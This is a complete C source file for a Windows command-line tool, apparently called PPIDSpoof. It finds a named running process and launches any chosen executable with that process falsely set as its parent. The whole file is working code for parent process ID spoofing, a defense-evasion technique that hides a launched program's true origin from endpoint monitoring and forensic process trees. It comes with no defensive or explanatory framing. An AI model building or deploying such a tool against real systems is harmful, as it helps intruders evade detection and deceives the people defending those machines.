#include "Windows.h"
#include "stdio.h"
#include "winternl.h"

#define IMAGE_NAME_MAX_SIZE 300
#define NEW_PROCESS_CURRENT_DIR_PATH_MAX_SIZE 300

void getSystemProcessInformation(OUT ULONG* pProcessInformationSizeWritten, OUT PVOID* pSystemProcessInformation) {
	// Get NtQuerySystemInformation
	HMODULE hModule = LoadLibraryW(L"ntdll.dll");
	if (hModule == NULL) {
		wprintf(L"Could not get handle to ntdll.dll\n");
		exit(GetLastError());
	}
	LPVOID pNtQuerySystemInformation = GetProcAddress(hModule, "NtQuerySystemInformation");
	if (pNtQuerySystemInformation == NULL) {
		wprintf(L"Could not find NtQuerySystemInformation\n");
		exit(GetLastError());
	}
	NTSTATUS (*NtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG) = (NTSTATUS (*)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG))pNtQuerySystemInformation;

	// Get processes
	ULONG processInformationSizeReqd = 0;
	*pProcessInformationSizeWritten = 0;
	NTSTATUS stats = NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &processInformationSizeReqd);
	if (processInformationSizeReqd == 0) {
		wprintf(L"Failed to use NtQuerySystemInformation to get data size required; error: %d\n", stats);
		exit(stats);
	}
	*pSystemProcessInformation = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, processInformationSizeReqd);
	if (*pSystemProcessInformation == NULL) {
		wprintf(L"Failed to allocate memory for process information\n");
		wprintf(L"Last error: %d\n", GetLastError());
		exit(GetLastError());
	}

	stats = NtQuerySystemInformation(SystemProcessInformation, *pSystemProcessInformation, processInformationSizeReqd, pProcessInformationSizeWritten);
	if (stats != 0 || processInformationSizeReqd != *pProcessInformationSizeWritten) {
		wprintf(L"Failed to use NtQuerySystemInformation to get process information; error: %d\n", stats);
		HeapFree(GetProcessHeap(), NULL, *pSystemProcessInformation);
		exit(stats);
	}
}

void toLowerStringW(PWCHAR processNameLower, PWCHAR processName) {
	for (int i = 0; i < IMAGE_NAME_MAX_SIZE; i++) {
		processNameLower[i] = towlower(processName[i]);

		if (processNameLower[i] == 0) {
			break;
		}
	}
}

DWORD getProcessIdFromName(LPVOID pSystemProcessInformationRaw, PWCHAR targetProcessName) {
	// Lowercase names
	WCHAR targetProcessNameLower[IMAGE_NAME_MAX_SIZE + 1];
	WCHAR processNameLower[IMAGE_NAME_MAX_SIZE + 1];
	toLowerStringW(&targetProcessNameLower, targetProcessName);

	// In a loop, iterate through all processes, and check if it's target
	PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation = (PSYSTEM_PROCESS_INFORMATION)pSystemProcessInformationRaw;
	while (TRUE) {
		// If process name matches, return process id
		if (pSystemProcessInformation->ImageName.Buffer != NULL) {
			toLowerStringW(processNameLower, pSystemProcessInformation->ImageName.Buffer);
			if (wcscmp(targetProcessNameLower, processNameLower) == 0) {
				return pSystemProcessInformation->UniqueProcessId;
			}
		}

		// If there's no next process, break
		if (pSystemProcessInformation->NextEntryOffset == NULL) {
			return -1;
		}
		// Else, advance to next process
		else {
			pSystemProcessInformation = (PSYSTEM_PROCESS_INFORMATION)((DWORD64)pSystemProcessInformation + pSystemProcessInformation->NextEntryOffset);
		}
	}
}

void createNewProcess(IN PWCHAR imagePath, IN PWCHAR arguments, IN PHANDLE pHSpoofedParentProcess, OUT PPROCESS_INFORMATION pProcessInformation) {
	// Get process heap
	HANDLE processHeap = GetProcessHeap();

	// Get System32 dir
	WCHAR newProcessCurrentDirectory[NEW_PROCESS_CURRENT_DIR_PATH_MAX_SIZE] = L"";
	GetEnvironmentVariableW(L"WINDIR", newProcessCurrentDirectory, NEW_PROCESS_CURRENT_DIR_PATH_MAX_SIZE);
	wcscat_s(newProcessCurrentDirectory, NEW_PROCESS_CURRENT_DIR_PATH_MAX_SIZE, L"\\System32");

	// Prepare thread attribute list
	DWORD64 threadAttributeListSize = 0;
	InitializeProcThreadAttributeList(NULL, 1, 0, &threadAttributeListSize);
	if (threadAttributeListSize == 0) {
		wprintf(L"Failed to get buffer size for thread attribute list\n");
		wprintf(L"Last error: %d\n", GetLastError());
		return;
	}
	LPVOID pThreadAttributeList = HeapAlloc(processHeap, HEAP_ZERO_MEMORY, threadAttributeListSize);
	if (!InitializeProcThreadAttributeList(pThreadAttributeList, 1, 0, &threadAttributeListSize)) {
		wprintf(L"Failed to initialise thread attribute list\n");
		wprintf(L"Last error: %d\n", GetLastError());
		HeapFree(processHeap, NULL, pThreadAttributeList);
		return;
	}
	if (!UpdateProcThreadAttribute(pThreadAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, pHSpoofedParentProcess, sizeof(HANDLE), NULL, NULL)) {
		wprintf(L"Failed to update thread attribute list with spoofed parent process\n");
		wprintf(L"Last error: %d\n", GetLastError());
		HeapFree(processHeap, NULL, pThreadAttributeList);
		return;
	}

	// Create startup info
	STARTUPINFOW startupInfo = {.cb = sizeof(STARTUPINFOEXW)};
	STARTUPINFOEXW startupInfoEx = { .StartupInfo = startupInfo , .lpAttributeList = pThreadAttributeList };

	// Create process
	if (!CreateProcessW(imagePath, arguments, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, newProcessCurrentDirectory, &startupInfoEx, pProcessInformation)) {
		wprintf(L"Failed to create new process\n");
		wprintf(L"Last error: %d\n", GetLastError());
		HeapFree(processHeap, NULL, pThreadAttributeList);
		return;
	}

	// Cleanup
	DeleteProcThreadAttributeList(pThreadAttributeList);
	HeapFree(processHeap, NULL, pThreadAttributeList);
}

void wmain(DWORD argc, PWCHAR argv[]) {
	// Validate and process command line arguments
	if (argc != 3) {
		wprintf(L"Usage: PPIDSpoof.exe <PARENT_PROCESS_NAME_TO_SPOOF> <NEW_PROCESS_IMAGE_PATH>\n");
		return;
	}
	PWCHAR parentProcessNameToSpoof = argv[1];
	PWCHAR newProcessImagePath = argv[2];

	// Get list of all processes
	LPVOID pSystemProcessInformation;
	ULONG processInformationSizeWritten;
	getSystemProcessInformation(&processInformationSizeWritten, &pSystemProcessInformation);

	// Search for the process to use as Parent process for spoofing
	DWORD targetProcessId = getProcessIdFromName(pSystemProcessInformation, parentProcessNameToSpoof);
	if (targetProcessId == -1) {
		wprintf(L"Target process '%s' was not found\n", parentProcessNameToSpoof);
		HeapFree(GetProcessHeap(), NULL, pSystemProcessInformation);
		return;
	}

	// Create new process
	HANDLE hTargetProcess = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, targetProcessId);
	PROCESS_INFORMATION processInformation;
	createNewProcess(newProcessImagePath, NULL, &hTargetProcess, &processInformation);
	if (processInformation.hProcess != NULL) {
		wprintf(L"New process created; PID: %d\n", processInformation.dwProcessId);
	}

	// Cleanup
	HeapFree(GetProcessHeap(), NULL, pSystemProcessInformation);
	CloseHandle(hTargetProcess);
	if (processInformation.hProcess != NULL) {
		CloseHandle(processInformation.hThread);
		CloseHandle(processInformation.hProcess);
	}
}


